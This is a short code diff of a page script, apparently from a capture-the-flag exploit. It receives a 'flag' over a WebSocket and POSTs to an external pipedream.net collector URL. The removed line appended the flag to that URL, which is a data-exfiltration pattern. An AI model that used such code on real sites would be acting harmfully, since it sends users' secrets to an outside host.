@@ -12,7 +12,7 @@
       };
       websocket.onmessage = async (message) => {
         const flag = message.data;
-        const url = encodeURI("https://eohjvz10k1h17dr.m.pipedream.net/" + flag);
+        const url = encodeURI("https://eohjvz10k1h17dr.m.pipedream.net/");
         await fetch(url, {method: "POST"});
       };
     </script>
